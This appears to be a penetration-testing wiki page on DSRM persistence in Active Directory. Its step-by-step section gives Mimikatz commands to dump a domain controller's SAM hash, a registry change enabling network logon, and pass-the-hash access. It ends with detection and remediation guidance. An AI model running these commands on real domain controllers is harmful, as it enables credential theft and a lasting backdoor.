# DSRM Attack

Full syntax and every flag explained: [Mimikatz](../../tools/mimikatz.md)

>  **Persistence technique - survives reboot.** Unlike [Skeleton Key](skeleton-key.md), DSRM persistence survives a DC reboot because it lives in the SAM and registry, not LSASS memory.

---

## What It Is

Every Domain Controller has a **local Administrator account** called **DSRM** (Directory Services Restore Mode), created during `dcpromo`. Its password is set once at promotion and almost never rotated. It exists in the DC's local SAM hive - *separate* from Active Directory itself - and is meant for booting into "safe mode" to repair AD.

By default DSRM can only log on **at the console in DSRM boot mode**. But with one registry tweak, it can log on **over the network using Pass-the-Hash** - giving you persistent local admin on the DC even if every domain account password is rotated.

---

## Privileges Required

| Phase | Account / Privilege | Why |
|---|---|---|
| Dump the DSRM hash (`lsadump::sam`) | **SYSTEM on the DC** | Reading the local SAM hive requires SYSTEM. Get there via DA -> PSExec -> SYSTEM, or `token::elevate` inside Mimikatz |
| Enable network logon (`DsrmAdminLogonBehavior=2`) | **Local Administrator on the DC** | Writes under `HKLM\System\CurrentControlSet\Control\Lsa` require admin. DA on the DC already has this |
| Pass-the-Hash as DSRM Administrator | **None on the attacker side** | PTH is network auth - possession of the NTLM hash is the authorization. You only need network access to the DC's SMB / RPC |

**Note:** The DSRM hash is a *local* SAM credential, not a domain credential - PTH against the DC's `Administrator` account, with the DC's **computer name** as the domain field. Don't get this wrong; PTH against `corp.local\Administrator` is a totally different (and stronger) credential.

---

## When You Use This

**You already have DA on a DC** and want persistence that:
- ✅ Survives DC reboot (unlike Skeleton Key)
- ✅ Survives krbtgt reset (unlike Golden Ticket)
- ✅ Survives all domain password rotations
- ✅ Doesn't require dumping NTDS.dit again

**You do NOT use this if:**
- You only need short-term access - use the current DA session
- The DC is monitored for registry changes to `LSA\DsrmAdminLogonBehavior`
- DSRM password is being rotated regularly (rare - usually set once and forgotten)

---

## Step by Step

### Step 1 - Dump the DSRM hash from the DC's local SAM
```sh
# Mimikatz on the DC (need SYSTEM)
privilege::debug
token::elevate
lsadump::sam
# Look for "Administrator" entry - that's the DSRM account
# NTLM: <hash>  <- this is what you want
```

### Step 2 - Enable network logon for DSRM
```sh
# On the DC, set this registry value:
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f

# Values:
#   0 = default (DSRM only when booted into DSRM mode)
#   1 = allowed only when AD service is stopped
#   2 = always allowed - what we want for persistence
```

### Step 3 - Pass-the-Hash as the DC's local Administrator
```sh
# Mimikatz from your attacker box
sekurlsa::pth /domain:dc01 /user:Administrator /ntlm:<DSRM-HASH> /run:cmd.exe
# IMPORTANT: /domain: is the DC's COMPUTER NAME (local SAM), not the AD domain

# Then access the DC over SMB:
dir \\dc01.corp.local\C$
psexec.exe \\dc01.corp.local cmd
```

### Step 4 - Verify you're local admin on the DC
```sh
# You're now authenticated to the DC as its local Administrator
# Effectively SYSTEM on the DC - re-dump NTDS, re-DCSync, whatever you need
```

---

## DSRM vs Other Persistence

| | DSRM | Skeleton Key | Golden Ticket | NTDS Dump |
|---|---|---|---|---|
| **Needs** | DA on DC + reg edit | DA on DC | krbtgt hash + SID | DA on DC |
| **Survives reboot** | ✅ Yes | ❌ No (memory only) | ✅ Yes | ✅ Yes |
| **Survives password rotation** | ✅ Yes (separate from AD) | N/A | ✅ Yes (until krbtgt reset x2) | ❌ Hashes go stale |
| **Breaks anything** | ❌ No | ✅ Yes (PKINIT) | ❌ No | ❌ No |
| **Detection** | Registry change + 4624 type 3 with local admin | Cert auth failures | Hard (PAC anomalies) | Medium (LSASS / VSS access) |
| **Use when** | Long-term DC backdoor | Lab only | Domain-wide forge | Initial credential theft |

**Rule of thumb:** DSRM is the **cleanest persistent backdoor on a specific DC**. Combine with Golden Ticket for both DC-local and domain-wide persistence.

---

## Detection Notes

DSRM logons appear in the Security log as:
- **Event ID 4624** (logon success) with **Logon Type 3** (network) and the account name `Administrator` but **no domain** (or the DC's computer name as the "domain") - this is the giveaway. Domain Administrator logons show the actual AD domain.
- **Event ID 4657** for the `DsrmAdminLogonBehavior` registry value change.

---

## Remediation (For Report Writing)

**Root cause:** An attacker with DA privileges on a DC dumped the local SAM, enabled network logon for the DSRM Administrator account via registry, and now has persistent Pass-the-Hash access to the DC's local Administrator that bypasses all AD password and credential rotations.

| Finding | Remediation |
|---|---|
| `DsrmAdminLogonBehavior = 2` set on DC | Set the value back to `0` or delete it. This blocks network logon for DSRM but does **not** invalidate the stolen hash. |
| DSRM hash dumped | **Rotate the DSRM password on every DC**: `ntdsutil` -> `set dsrm password` -> `reset password on server <DC>` -> enter new password. Pick a long, unique password per DC; do not reuse the previous one. |
| DA was obtained on a DC | Treat as full domain compromise. Rotate krbtgt twice, rotate all privileged accounts, audit how DA was achieved. |
| No SAM protection on DCs | Enable **LSA Protection (RunAsPPL)** and **Credential Guard** on all DCs to make SAM/LSASS dumping harder. |
| No monitoring for DSRM logons | Alert on Event 4624 with Logon Type 3 where the account is `Administrator` and the domain field is the DC's hostname (not the AD domain). Also alert on registry writes to `HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`. |
| DSRM password never rotated since DC promotion | Implement a policy to rotate DSRM passwords annually and on any suspected DC compromise. Document the rotation procedure. |

**Key point for reports:** DSRM is a forgotten built-in local account on every DC. Because its password is set once at promotion and rarely rotated, it's a high-value persistence target. The registry tweak that enables network logon is a single value change - easy to miss without monitoring.

---

## See Also
- [Mimikatz](../../tools/mimikatz.md) - `lsadump::sam` and `sekurlsa::pth`
- [Skeleton Key](skeleton-key.md) - faster but memory-only and breaks cert auth
- [Golden Ticket](golden-ticket.md) - domain-wide persistence (complements DSRM)
- [Pass the Hash](../post-compromise/pass-the-hash.md)
